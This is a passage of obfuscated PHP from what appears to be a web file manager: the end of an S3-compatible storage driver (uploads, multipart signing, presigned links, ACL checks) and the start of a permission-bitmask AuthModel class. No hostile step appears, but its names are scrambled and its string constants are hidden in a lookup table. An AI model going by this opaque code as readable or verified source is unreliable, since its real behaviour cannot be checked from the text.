$Ú˜›ª¬ë, $Œ‘ô¼°ä, !0); } public function has($×´ø¬Âä, $Áø¶®åó = false, $şàº”ªÙ = true) { $ÆÅ½³´¦ =& $_SERVER[ŒÅŸ‹ä†]; $×´ø¬Âä = trim($×´ø¬Âä, $ÆÅ½³´¦[8]); $¯¹¹Á‡Ş = empty($×´ø¬Âä) && $×´ø¬Âä !== $ÆÅ½³´¦[239] ? $ÆÅ½³´¦[12] : $×´ø¬Âä . $ÆÅ½³´¦[8]; $•ĞÙ¬®¥ = null; $ŸÃå¤ŒÃ = 500; $ÚÑºÚ = $ÆÅ½³´¦[8]; $ßÃ²ô© = $šò·Ş· = array(); while (!0) { $úÒÁÓŠ„ = $this->listObjs($×´ø¬Âä, $•ĞÙ¬®¥, $ŸÃå¤ŒÃ, $ÚÑºÚ); if (!$úÒÁÓŠ„) { break; } $•ĞÙ¬®¥ = $úÒÁÓŠ„[$ÆÅ½³´¦[249]]; $¡®áŞ› = $úÒÁÓŠ„[$ÆÅ½³´¦[247]]; $â õ¦ìŠ = $úÒÁÓŠ„[$ÆÅ½³´¦[248]]; if (empty($¡®áŞ›) && empty($â õ¦ìŠ)) { break; } if (count($¡®áŞ›) == 1 && $¡®áŞ›[0][$ÆÅ½³´¦[42]] == $¯¹¹Á‡Ş) { break; } if ($Áø¶®åó) { if (count($¡®áŞ›)) { $¡®áŞ› = array_column($¡®áŞ›, $ÆÅ½³´¦[42]); $ßÃ²ô© = array_merge($ßÃ²ô©, $¡®áŞ›); } if (count($â õ¦ìŠ)) { $â õ¦ìŠ = array_column($â õ¦ìŠ, $ÆÅ½³´¦[42]); $šò·Ş· = array_merge($šò·Ş·, $â õ¦ìŠ); } if ($•ĞÙ¬®¥ === null) { break; } continue; } if ($şàº”ªÙ) { if (!empty($¡®áŞ›)) { if (count($¡®áŞ›) > 1 || isset($¡®áŞ›[0][$ÆÅ½³´¦[42]]) && $¡®áŞ›[0][$ÆÅ½³´¦[42]] != $¯¹¹Á‡Ş) { return !0; } } } else { if (!empty($â õ¦ìŠ)) { return !0; } } if ($•ĞÙ¬®¥ === null) { break; } } if ($Áø¶®åó) { $ßÃ²ô© = array_diff($ßÃ²ô©, array($¯¹¹Á‡Ş)); $ßÃ²ô© = count(array_unique($ßÃ²ô©)); $šò·Ş· = count(array_unique($šò·Ş·)); return array($ÆÅ½³´¦[250] => $ßÃ²ô©, $ÆÅ½³´¦[251] => $šò·Ş·); } return !1; } public function listAll($â´ÅÔ…¸) { $Âä–”ä =& $_SERVER[ŒÅŸ‹ä†]; $‹€›º¼Á = $this->fileList($â´ÅÔ…¸, $Âä–”ä[12], !0); $’¨áùõÙ = array_to_keyvalue($‹€›º¼Á[$Âä–”ä[96]], $Âä–”ä[42]); foreach ($‹€›º¼Á[$Âä–”ä[95]] as $û«¼”É…) { if (is_string($û«¼”É…)) { $’¨áùõÙ[$û«¼”É…] = array($Âä–”ä[89] => 0); } } return $this->listAllFiles($â´ÅÔ…¸, $’¨áùõÙ); } public function canRead($ÖÍä‹©“) { $¬ÏïµÔì =& $_SERVER[ŒÅŸ‹ä†]; $¶«äœı = $this->client->getAccessControlPolicy($this->bucket, $ÖÍä‹©“); if (!$¶«äœı) { return !1; } return in_array($¶«äœı, array($¬ÏïµÔì[252], $¬ÏïµÔì[253], $¬ÏïµÔì[254])) ? !0 : !1; } public function canWrite($‹Çò»ÒÈ) { $µ¼ öâà =& $_SERVER[ŒÅŸ‹ä†]; $è«ÚÎª• = $this->client->getAccessControlPolicy($this->bucket, $‹Çò»ÒÈ); if (!$è«ÚÎª•) { return !1; } return in_array($è«ÚÎª•, array($µ¼ öâà[252], $µ¼ öâà[253])) ? !0 : !1; } public function getContent($ îå•ğĞ) { return $this->client->getObject($this->bucket, $ îå•ğĞ); } public function setContent($³Ëîˆ, $í„ÑñÕ™ = '', $Àü÷À¾² = false) { $Ş‹™œöè =& $_SERVER[ŒÅŸ‹ä†]; $³Ëîˆ = $Àü÷À¾² ? trim($³Ëîˆ, $Ş‹™œöè[8]) . $Ş‹™œöè[8] : $³Ëîˆ; $ù­Å×¸¿ = get_file_mime(get_path_ext($³Ëîˆ)); $†Á”æô´ = $this->client->putObject($í„ÑñÕ™, $this->bucket, $³Ëîˆ, $Ş‹™œöè[240], array(), $ù­Å×¸¿); if (!$†Á”æô´) { return !1; } if ($Àü÷À¾²) { return !0; } return $†Á”æô´ ? !0 : !1; } public function fileSubstr($çÕğà®ˆ, $±¤¨©”Ş, $ß©„»ò˜) { $‰¡ÒÄ£ = $±¤¨©”Ş + $ß©„»ò˜ - 1; return $this->client->getObject($this->bucket, $çÕğà®ˆ, array($_SERVER[ŒÅŸ‹ä†][255] => "\142\x79\x74\145\163\75{$±¤¨©”Ş}\x2d{$‰¡ÒÄ£}")); } public function upload($ÀÓ ¿, $¡ÜÖƒ, $ğ×ƒÜí = false, $ÇÍÒéø§ = REPEAT_REPLACE) { $Õ·¤…Ó— =& $_SERVER[ŒÅŸ‹ä†]; $Üè ÃŠè = array($Õ·¤…Ó—[256] => @md5_file($¡ÜÖƒ)); $úæóµñì = array($Õ·¤…Ó—[257] => get_file_mime(get_path_ext($ÀÓ ¿))); if (IO::size($¡ÜÖƒ) <= 1024 * 1024 * 200) { $µ¨¯©¢¾ = $this->client->putObjectFile($¡ÜÖƒ, $this->bucket, $ÀÓ ¿, $Õ·¤…Ó—[240], $Üè ÃŠè, $úæóµñì); return !empty($µ¨¯©¢¾) ? $this->getPathOuter($ÀÓ ¿) : !1; } $”ªå÷§ô = $this->client->multiUploadObject($¡ÜÖƒ, $this->bucket, trim($ÀÓ ¿, $Õ·¤…Ó—[8]), $Üè ÃŠè, $úæóµñì); return $”ªå÷§ô ? $this->getPathOuter($ÀÓ ¿) : !1; } public function download($Ìëì», $Ğàûß) { if (!@is_dir($this->pathFather($Ğàûß)) && !IO::mkdir($this->pathFather($Ğàûß))) { return !1; } $è¦ÌÁ¬ = $this->client->getObject($this->bucket, $Ìëì», array(), $Ğàûß); return $è¦ÌÁ¬ !== !1 ? $Ğàûß : !1; } public function link($Êíø¢èâ, $êîİ±Êá = array()) { return $this->getPreSignedURL($Êíø¢èâ, 3600 * 12, $êîİ±Êá); } private function getPreSignedURL($Úğ»›–µ, $éš¶ê­ş, $Õ¦„¡ôŠ = array(), $İ†ÂÒ¡• = "\x47\105\x54") { $…­¹ÎŒÙ =& $_SERVER[ŒÅŸ‹ä†]; $Úğ»›–µ = trim($Úğ»›–µ, $…­¹ÎŒÙ[8]); if ($this->signVer == $…­¹ÎŒÙ[258]) { return $this->client->getPreSignedV2URL($this->bucket, $Úğ»›–µ, $éš¶ê­ş, $İ†ÂÒ¡•, $Õ¦„¡ôŠ); } return $this->client->getPreSignedV4URL($this->bucket, $Úğ»›–µ, $éš¶ê­ş, array(), $İ†ÂÒ¡•, $Õ¦„¡ôŠ); } public function fileOut($éÎãÇŞ§, $­ãƒÅñ“ = false, $¿¿ÁÁé¸ = false, $¯í“ùÉ½ = '') { $ŠÁ®¿£Â =& $_SERVER[ŒÅŸ‹ä†]; if ($this->isFileOutServer()) { return $this->fileOutServer($éÎãÇŞ§, $­ãƒÅñ“, $¿¿ÁÁé¸, $¯í“ùÉ½); } if (!$¿¿ÁÁé¸) { $¿¿ÁÁé¸ = $this->pathThis($éÎãÇŞ§); } $ôÙ„›ûò = get_file_mime(get_path_ext($¿¿ÁÁé¸)); if ($ôÙ„›ûò == $ŠÁ®¿£Â[259]) { return parent::fileOut($éÎãÇŞ§, $­ãƒÅñ“, $¿¿ÁÁé¸, $¯í“ùÉ½); } $Ü‘°¶¢ = array($ŠÁ®¿£Â[260] => $ôÙ„›ûò); if ($­ãƒÅñ“) { $Ü‘°¶¢[$ŠÁ®¿£Â[261]] = $ŠÁ®¿£Â[262] . rawurlencode($¿¿ÁÁé¸); } else { } $„´±ĞÔÉ = $this->link($éÎãÇŞ§, $Ü‘°¶¢); $this->fileOutLink($„´±ĞÔÉ); } public function fileOutServer($¯¦£ò„, $ûéò¶ïª = false, $áñı€¿ˆ = false, $–ÙŞó« = '') { parent::fileOut($¯¦£ò„, $ûéò¶ïª, $áñı€¿ˆ, $–ÙŞó«); } public function fileOutImageServer($®â²ßê­, $ÉÁØ³¹œ = 250) { parent::fileOutImage($®â²ßê­, $ÉÁØ³¹œ); } public function fileOutLink($É­ï®–) { $áÒº¯ûã =& $_SERVER[ŒÅŸ‹ä†]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($áÒº¯ûã[77], $áÒº¯ûã[76], $áÒº¯ûã[78])) && !get_url_scheme($this->endpoint) && substr($É­ï®–, 0, 7) == $áÒº¯ûã[227]) { $É­ï®– = $áÒº¯ûã[228] . substr($É­ï®–, 7); } header($áÒº¯ûã[183] . $É­ï®–); die; } public function hashMd5($ôç¬«ÁÇ, $˜Ì™³İ˜ = '') { $Ù­ïĞ« = $this->objectMeta($ôç¬«ÁÇ); if (!$Ù­ïĞ«) { return !1; } $˜Ì™³İ˜ = $˜Ì™³İ˜ ? $˜Ì™³İ˜ : _get($Ù­ïĞ«, $_SERVER[ŒÅŸ‹ä†][263]); return $˜Ì™³İ˜; } public function uploadFormData($Üâ¢í˜, $Éæ˜ ô = 3600) { $°Öˆöëö =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->_isClientAsync()) { $ñÀ‘•¢À = $this->getPreSignedURL($Üâ¢í˜, $Éæ˜ ô, array(), $°Öˆöëö[264]); return array($°Öˆöëö[217] => str_replace($°Öˆöëö[227], $°Öˆöëö[265], $ñÀ‘•¢À)); } if (isset($GLOBALS[$°Öˆöëö[6]][$°Öˆöëö[102]][$°Öˆöëö[266]]) && $GLOBALS[$°Öˆöëö[6]][$°Öˆöëö[102]][$°Öˆöëö[266]] == $°Öˆöëö[239]) { return $this->uploadMultiData($Üâ¢í˜, $Éæ˜ ô); } if ($this->signVer == $°Öˆöëö[258]) { return $this->uploadFormDataV2($Üâ¢í˜, $Éæ˜ ô); } return $this->uploadFormDataV4($Üâ¢í˜, $Éæ˜ ô); } public function uploadFormDataV2($İ´íˆß’, $•²ìºÖÈ = 3600) { $ìåù× =& $_SERVER[ŒÅŸ‹ä†]; $¾·¼äÈ‘ = $this->pathFather($İ´íˆß’); $†ÚÖ½¼· = $this->client->getHttpUploadPostParams($this->bucket, $¾·¼äÈ‘, $ìåù×[240], $•²ìºÖÈ); $å­Şõ‰ = array_merge((array) $†ÚÖ½¼·, array($ìåù×[267] => $ìåù×[258], $ìåù×[217] => $this->getHost())); if ($this->_isClientAsync()) { unset($å­Şõ‰[$ìåù×[267]]); } return $å­Şõ‰; } public function uploadFormDataV4($á³ú•¢À, $«„İÑú = 3600) { $âäôøÂî =& $_SERVER[ŒÅŸ‹ä†]; $ÃÊ¯°œï = $âäôøÂî[240]; $°ƒÎ·»õ = $âäôøÂî[268]; $à¸‹çü² = $âäôøÂî[72]; $“´–İœã = gmdate($âäôøÂî[269]); $ããÏ’Š¹ = gmdate($âäôøÂî[270]); $­Ñãê§‚ = $âäôøÂî[271]; $Ä››“ë© = $«„İÑú . $âäôøÂî[12]; $°ü³ ´ã = $âäôøÂî[272]; $ŞË–Õ = array($this->accessKey, $ããÏ’Š¹, $this->region, $à¸‹çü², $­Ñãê§‚); $´¥©Ö“Ç = implode($âäôøÂî[8], $ŞË–Õ); $”´ëÁï„ = array($âäôøÂî[273] => gmdate($âäôøÂî[274], strtotime($âäôøÂî[275])), $âäôøÂî[276] => array(array($âäôøÂî[277] => $this->bucket), array($âäôøÂî[278], $âäôøÂî[279], $âäôøÂî[12]), array($âäôøÂî[278], $âäôøÂî[280], $âäôøÂî[12]), array($âäôøÂî[281] => $°ü³ ´ã), array($âäôøÂî[282] => $´¥©Ö“Ç), array($âäôøÂî[283] => $°ƒÎ·»õ), array($âäôøÂî[284] => $“´–İœã), array($âäôøÂî[285] => $Ä››“ë©))); $ê¬­óËÔ = base64_encode(json_encode($”´ëÁï„)); $‹‚îì¸æ = hash_hmac($âäôøÂî[286], $ããÏ’Š¹, $âäôøÂî[287] . $this->secret, !0); $Šâİ§™® = hash_hmac($âäôøÂî[286], $this->region, $‹‚îì¸æ, !0); $Ş¬»å…Ú = hash_hmac($âäôøÂî[286], $à¸‹çü², $Šâİ§™®, !0); $éïŞØî» = hash_hmac($âäôøÂî[286], $­Ñãê§‚, $Ş¬»å…Ú, !0); $µ—°¯õ´ = hash_hmac($âäôøÂî[286], $ê¬­óËÔ, $éïŞØî»); $Ûš˜­Î = array($âäôøÂî[257] => $âäôøÂî[12], $âäôøÂî[281] => $°ü³ ´ã, $âäôøÂî[288] => $ê¬­óËÔ, $âäôøÂî[282] => $´¥©Ö“Ç, $âäôøÂî[283] => $°ƒÎ·»õ, $âäôøÂî[284] => $“´–İœã, $âäôøÂî[285] => $Ä››“ë©, $âäôøÂî[289] => $µ—°¯õ´, $âäôøÂî[267] => $âäôøÂî[258], $âäôøÂî[217] => $this->getHost()); if ($this->_isClientAsync()) { unset($Ûš˜­Î[$âäôøÂî[267]]); } return $Ûš˜­Î; } public function uploadMultiData($œÙ£ÍÏí, $ª§¹ôŠü = 3600) { $¢±Èå¢í =& $_SERVER[ŒÅŸ‹ä†]; $‹óÁì¬Ê = $this->signVer == $¢±Èå¢í[258] ? gmdate($¢±Èå¢í[290]) : gmdate($¢±Èå¢í[291]); $ìÒÄ÷› = array(); $æş²İŒÒ = $this->client->getUploadId($this->bucket, $œÙ£ÍÏí, $ìÒÄ÷›); if (!$æş²İŒÒ) { return !1; } $Õë’é­Ì = array($¢±Èå¢í[292] => $æş²İŒÒ, $¢±Èå¢í[217] => $this->getHost() . $¢±Èå¢í[8] . $this->pathEncode($œÙ£ÍÏí), $¢±Èå¢í[293] => $‹óÁì¬Ê, $¢±Èå¢í[105] => $œÙ£ÍÏí, $¢±Èå¢í[267] => $this->signVer); if ($this->_isClientAsync()) { unset($Õë’é­Ì[$¢±Èå¢í[267]]); } return $Õë’é­Ì; } public function uploadMultiAuth($î±É¦ıÎ, $Í¤¤¨¯® = array()) { $Î—½ç´ =& $_SERVER[ŒÅŸ‹ä†]; if ($this->signVer == $Î—½ç´[258]) { if (isset($Í¤¤¨¯®[$Î—½ç´[294]])) { return $this->uploadPartAuthV2($î±É¦ıÎ, $Í¤¤¨¯®); } return $this->uploadListAuthV2($î±É¦ıÎ, $Í¤¤¨¯®); } if (isset($Í¤¤¨¯®[$Î—½ç´[294]])) { return $this->uploadPartAuthV4($î±É¦ıÎ, $Í¤¤¨¯®); } return $this->uploadListAuthV4($î±É¦ıÎ, $Í¤¤¨¯®); } public function uploadPartAuthV2($èúáõ¾½, $´ÔıË = array()) { $Œ´É­™˜ =& $_SERVER[ŒÅŸ‹ä†]; $½ìû‡‡ = $´ÔıË[$Œ´É­™˜[105]]; $éÍñ€éÏ = gmdate($Œ´É­™˜[290]); $âí’‰œÉ = array_intersect_key($´ÔıË, array_flip(array($Œ´É­™˜[294], $Œ´É­™˜[292]))); ksort($âí’‰œÉ); $ÔÕ¨öÀ = $âí’‰œÉ ? $Œ´É­™˜[86] . http_build_query($âí’‰œÉ, null, $Œ´É­™˜[295], PHP_QUERY_RFC3986) : $Œ´É­™˜[12]; $”òÂÃÁ“ = array($Œ´É­™˜[264], $Œ´É­™˜[12], $Œ´É­™˜[131], $Œ´É­™˜[12], "\x78\55\141\x6d\x7a\55\144\141\164\145\x3a{$éÍñ€éÏ}", $Œ´É­™˜[8] . $this->bucket . $Œ´É­™˜[8] . $this->pathEncode($½ìû‡‡) . $ÔÕ¨öÀ); $Ìàé›üÄ = implode($Œ´É­™˜[18], $”òÂÃÁ“); $ñè ä° = $this->client->__getSignature($Ìàé›üÄ); return array($Œ´É­™˜[296] => $ñè ä°, $Œ´É­™˜[293] => $éÍñ€éÏ); } public function uploadListAuthV2($Ü¼¥ˆÜ, $È“¨¨‰ƒ = array()) { $¸şÙÄøÔ =& $_SERVER[ŒÅŸ‹ä†]; $ÔÙ¡²ú = $È“¨¨‰ƒ[$¸şÙÄøÔ[105]]; $¢şéãÛ = $È“¨¨‰ƒ[$¸şÙÄøÔ[292]]; $Ê›ÕŞÅ™ = $this->client->listParts($this->bucket, $ÔÙ¡²ú, $¢şéãÛ); if (!$Ê›ÕŞÅ™) { return !1; } $ÂèÉ÷¬œ = gmdate($¸şÙÄøÔ[290]); $‡ÛˆæúŠ = $¸şÙÄøÔ[297] . $¢şéãÛ; $ÂøÂ¹Ë = array($¸şÙÄøÔ[298], $¸şÙÄøÔ[12], $¸şÙÄøÔ[131], $¸şÙÄøÔ[12], "\x78\x2d\141\155\x7a\x2d\x64\x61\164\145\72{$ÂèÉ÷¬œ}", $¸şÙÄøÔ[8] . $this->bucket . $¸şÙÄøÔ[8] . $this->pathEncode($ÔÙ¡²ú) . $‡ÛˆæúŠ); $—¾ Ğ× = implode($¸şÙÄøÔ[18], $ÂøÂ¹Ë); $ó†µäË = $this->client->__getSignature($—¾ Ğ×); return array($¸şÙÄøÔ[296] => $ó†µäË, $¸şÙÄøÔ[293] => $ÂèÉ÷¬œ, $¸şÙÄøÔ[299] => $Ê›ÕŞÅ™); } public function uploadPartAuthV4($ˆĞ•£®, $Üé¼ÈˆÏ = array()) { $Ñùú”± =& $_SERVER[ŒÅŸ‹ä†]; $–¢ÄƒÈÉ = $Üé¼ÈˆÏ[$Ñùú”±[105]]; $÷§Ÿè¹¤ = array($Ñùú”±[284] => gmdate($Ñùú”±[291]), $Ñùú”±[300] => _get($Üé¼ÈˆÏ, $Ñùú”±[301], hash($Ñùú”±[286], $Ñùú”±[12]))); $øêÖ© = explode($Ñùú”±[219], $this->getHost()); $›¹Íå³­ = array($Ñùú”±[302] => $øêÖ©[1], $Ñùú”±[303] => $Ñùú”±[12], $Ñùú”±[257] => $Ñùú”±[131], $Ñùú”±[304] => $Üé¼ÈˆÏ[$Ñùú”±[89]]); $éËåéîÛ = $Ñùú”±[264]; $ÚÅ¼ÃÏ = $Ñùú”±[8] . $this->pathEncode($–¢ÄƒÈÉ); $›”˜ø¨ = array_intersect_key($Üé¼ÈˆÏ, array_flip(array($Ñùú”±[294], $Ñùú”±[292]))); $âı÷ş = $this->client->__getSignatureV4($÷§Ÿè¹¤, $›¹Íå³­, $éËåéîÛ, $ÚÅ¼ÃÏ, $›”˜ø¨); return array($Ñùú”±[296] => $âı÷ş, $Ñùú”±[300] => $÷§Ÿè¹¤[$Ñùú”±[300]], $Ñùú”±[293] => $÷§Ÿè¹¤[$Ñùú”±[284]]); } public function uploadListAuthV4($÷†Úå¦¨, $ò™ÌÖ¾Ô = array()) { $ìï˜¡Ì =& $_SERVER[ŒÅŸ‹ä†]; $«ô’°Î = $ò™ÌÖ¾Ô[$ìï˜¡Ì[105]]; $Ìûãâ¾ = $ò™ÌÖ¾Ô[$ìï˜¡Ì[292]]; $ÔÙæÙŒ = $this->client->listParts($this->bucket, $«ô’°Î, $Ìûãâ¾); if (!$ÔÙæÙŒ) { return !1; } $ƒ»—ÄğÖ = $ìï˜¡Ì[305]; foreach ($ÔÙæÙŒ as $Õ†µìòÅ) { $ƒ»—ÄğÖ .= $ìï˜¡Ì[306] . "\74\120\x61\x72\164\116\x75\155\142\145\x72\x3e{$Õ†µìòÅ[$ìï˜¡Ì[307]]}\x3c\x2f\x50\141\x72\x74\116\x75\155\142\x65\x72\x3e\xa" . "\74\x45\124\141\147\x3e{$Õ†µìòÅ[$ìï˜¡Ì[308]]}\74\57\105\124\141\x67\x3e\xa" . $ìï˜¡Ì[309]; } $ƒ»—ÄğÖ .= $ìï˜¡Ì[310]; $µï±ºˆú = array($ìï˜¡Ì[284] => gmdate($ìï˜¡Ì[291]), $ìï˜¡Ì[300] => hash($ìï˜¡Ì[286], $ƒ»—ÄğÖ)); $½Ğ‡ïê = explode($ìï˜¡Ì[219], $this->getHost()); $ÆèØÓ“ = array($ìï˜¡Ì[302] => $½Ğ‡ïê[1], $ìï˜¡Ì[257] => $ìï˜¡Ì[131], $ìï˜¡Ì[304] => strlen($ƒ»—ÄğÖ)); $”ê×Ÿš = $ìï˜¡Ì[298]; $»©‹µÛÒ = $ìï˜¡Ì[8] . $this->pathEncode($«ô’°Î); $Øß¸Ôô = array($ìï˜¡Ì[292] => $Ìûãâ¾); $®Èôë = $this->client->__getSignatureV4($µï±ºˆú, $ÆèØÓ“, $”ê×Ÿš, $»©‹µÛÒ, $Øß¸Ôô); return array($ìï˜¡Ì[296] => $®Èôë, $ìï˜¡Ì[300] => $µï±ºˆú[$ìï˜¡Ì[300]], $ìï˜¡Ì[293] => $µï±ºˆú[$ìï˜¡Ì[284]], $ìï˜¡Ì[299] => $ÔÙæÙŒ); } private function _isClientAsync() { $òÈÈ¦³© =& $_SERVER[ŒÅŸ‹ä†]; static $·½Í°µ = null; if ($·½Í°µ === null) { $¶àÂÇ´ = isset($_REQUEST[$òÈÈ¦³©[311]]) ? json_decode($_REQUEST[$òÈÈ¦³©[311]], !0) : !1; $·½Í°µ = $¶àÂÇ´ && _get($¶àÂÇ´, $òÈÈ¦³©[312]) == $òÈÈ¦³©[313]; } return $·½Í°µ; } public function getHost() { $Îˆˆ« =& $_SERVER[ŒÅŸ‹ä†]; $º‹ë†©€ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($Îˆˆ«[80], $Îˆˆ«[74], $Îˆˆ«[79], $Îˆˆ«[72]))) { return $º‹ë†©€ . $Îˆˆ«[8] . $this->bucket; } if ($this->osType == $Îˆˆ«[72] && !is_domain($º‹ë†©€)) { return $º‹ë†©€ . $Îˆˆ«[8] . $this->bucket; } $º‹ë†©€ = explode($Îˆˆ«[219], $º‹ë†©€); return $º‹ë†©€[0] . $Îˆˆ«[219] . $this->bucket . $Îˆˆ«[10] . $º‹ë†©€[1]; } public function size($Ü¨Û›‘) { $ı âÙ±Ø = $this->objectMeta($Ü¨Û›‘); return $ı âÙ±Ø ? $ı âÙ±Ø[$_SERVER[ŒÅŸ‹ä†][89]] : 0; } public function info($´‘ÑÍğ¦) { if ($this->isFolder($´‘ÑÍğ¦)) { return $this->folderInfo($´‘ÑÍğ¦); } else { if ($this->isFile($´‘ÑÍğ¦)) { return $this->fileInfo($´‘ÑÍğ¦); } } return !1; } public function exist($¿ÊÆà¿·) { return $this->isFile($¿ÊÆà¿·) || $this->isFolder($¿ÊÆà¿·); } public function isFile($ç‰ÓÁŠÕ) { return !$this->isFolder($ç‰ÓÁŠÕ) && $this->objectMeta($ç‰ÓÁŠÕ); } public function isFolder($”å¹°) { return $this->cacheMethod($_SERVER[ŒÅŸ‹ä†][188], $”å¹°); } protected function objectMeta($Ş¶¨£¸Í) { return $this->cacheMethod($_SERVER[ŒÅŸ‹ä†][190], $Ş¶¨£¸Í); } protected function _objectMeta($‡Ùßıû) { $ä—Õß…Œ =& $_SERVER[ŒÅŸ‹ä†]; $‡Ùßıû = rtrim($‡Ùßıû, $ä—Õß…Œ[8]); try { $¯÷óÖà = $this->client->getObjectInfo($this->bucket, $‡Ùßıû); if (!isset($¯÷óÖà[$ä—Õß…Œ[263]]) && isset($¯÷óÖà[$ä—Õß…Œ[314]])) { $¯÷óÖà[$ä—Õß…Œ[263]] = $¯÷óÖà[$ä—Õß…Œ[314]]; } } catch (Exception $¨äÛ‰Ş) { $¯÷óÖà = !1; } if (!$¯÷óÖà) { } return $¯÷óÖà; } protected function _isFolder($ÜŸ¦©É€) { $ ÚìšÔì =& $_SERVER[ŒÅŸ‹ä†]; $ÜŸ¦©É€ = rtrim($ÜŸ¦©É€, $ ÚìšÔì[8]) . $ ÚìšÔì[8]; if ($ÜŸ¦©É€ == $ ÚìšÔì[12] || $ÜŸ¦©É€ == $ ÚìšÔì[8]) { return !0; } $Õù¿ ¹ = $this->client->getBucket($this->bucket, $ÜŸ¦©É€, null, 1); if (empty($Õù¿ ¹[$ ÚìšÔì[247]])) { return !1; } $ĞöÁ›ö = $Õù¿ ¹[$ ÚìšÔì[247]][0][$ ÚìšÔì[42]]; return stripos($ĞöÁ›ö, $ÜŸ¦©É€) === 0 ? !0 : !1; if (substr($ĞöÁ›ö, -1) == $ ÚìšÔì[8]) { return !0; } if (get_path_this($ĞöÁ›ö) == get_path_this($ÜŸ¦©É€)) { return !1; } return !0; } public function listObject($ßñ‰€Ê‰) { return $this->fileList($ßñ‰€Ê‰, $_SERVER[ŒÅŸ‹ä†][12], !0); } } goto B‹™‚èÑàì; eĞ±Û»ï½: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ìãé‡Ñ² =& $_SERVER[ŒÅŸ‹ä†]; $ÀË’§¸ = array(array($ìãé‡Ñ²[514] => LNG($ìãé‡Ñ²[2127]), $ìãé‡Ñ²[2128] => $ìãé‡Ñ²[2129], $ìãé‡Ñ²[2130] => 1, $ìãé‡Ñ²[2131] => 1, $ìãé‡Ñ²[2132] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ìãé‡Ñ²[514] => LNG($ìãé‡Ñ²[2133]), $ìãé‡Ñ²[2128] => $ìãé‡Ñ²[2134], $ìãé‡Ñ²[2130] => 2, $ìãé‡Ñ²[2131] => 1, $ìãé‡Ñ²[2132] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ìãé‡Ñ²[514] => LNG($ìãé‡Ñ²[2135]), $ìãé‡Ñ²[2128] => $ìãé‡Ñ²[2136], $ìãé‡Ñ²[2130] => 3, $ìãé‡Ñ²[2131] => 1, $ìãé‡Ñ²[2132] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ìãé‡Ñ²[514] => LNG($ìãé‡Ñ²[2137]), $ìãé‡Ñ²[2128] => $ìãé‡Ñ²[2138], $ìãé‡Ñ²[2130] => 4, $ìãé‡Ñ²[2131] => 1, $ìãé‡Ñ²[2132] => self::AUTH_SHOW | self::AUTH_VIEW), array($ìãé‡Ñ²[514] => LNG($ìãé‡Ñ²[2139]), $ìãé‡Ñ²[2128] => $ìãé‡Ñ²[2140], $ìãé‡Ñ²[2130] => 5, $ìãé‡Ñ²[2131] => 1, $ìãé‡Ñ²[2132] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ìãé‡Ñ²[514] => LNG($ìãé‡Ñ²[2141]), $ìãé‡Ñ²[2128] => $ìãé‡Ñ²[2142], $ìãé‡Ñ²[2130] => 6, $ìãé‡Ñ²[2131] => 1, $ìãé‡Ñ²[2132] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ìãé‡Ñ²[514] => LNG($ìãé‡Ñ²[2143]), $ìãé‡Ñ²[2128] => $ìãé‡Ñ²[2144], $ìãé‡Ñ²[2130] => 7, $ìãé‡Ñ²[2131] => 1, $ìãé‡Ñ²[2132] => 0)); return $ÀË’§¸; } public static function authCheck($Ãá±Û½æ, $ç ¥ÙÂ¨, $®à†¾à = true) { $¦¼Ÿ©òê =& $_SERVER[ŒÅŸ‹ä†]; $Ãá±Û½æ = intval($Ãá±Û½æ); if ($®à†¾à) { if (KodUser::isRoot() && $GLOBALS[$¦¼Ÿ©òê[6]][$¦¼Ÿ©òê[2145]]) { return !0; } } if ($Ãá±Û½æ <= 0) { return !1; } if (($Ãá±Û½æ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ãá±Û½æ & $ç ¥ÙÂ¨); } public static function authCheckShow($öÑÙ³àï) { return self::authCheck($öÑÙ³àï, self::AUTH_SHOW); } public static function authCheckView($ô¡¥Ï‹) { return self::authCheck($ô¡¥Ï‹, self::AUTH_VIEW); } public static function authCheckDownload($ïì¦—ˆ‹) { return self::authCheck($ïì¦—ˆ‹, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ïÖªşê‰) { return self::authCheck($ïÖªşê‰, self::AUTH_UPLOAD); } public static function authCheckEdit($à’¨ …ˆ) { return self::authCheck($à’¨ …ˆ, self::AUTH_EDIT); } public static function authCheckRemove($ÄªÀÓ’Ì) { return self::authCheck($ÄªÀÓ’Ì, self::AUTH_REMOVE); } public static function authCheckShare($±—Æ†ó) { return self::authCheck($±—Æ†ó, self::AUTH_SHARE); } public static function authCheckComment($ä”°÷îº) { return self::authCheck($ä”°÷îº, self::AUTH_COMMENT); } public static function authCheckEvent($Âêá˜¿û) { return self::authCheck($Âêá˜¿û, self::AUTH_EVENT); } public static function authCheckRoot($²ØÄ©§É) { return self::authCheck($²ØÄ©§É, self::AUTH_ROOT); } public static function authCheckAction($ŸŠ±é´Ä, $…ä©¡ ) { $Í×Ç‰ñÄ =& $_SERVER[ŒÅŸ‹ä†]; $ØÃœ×Ôş = 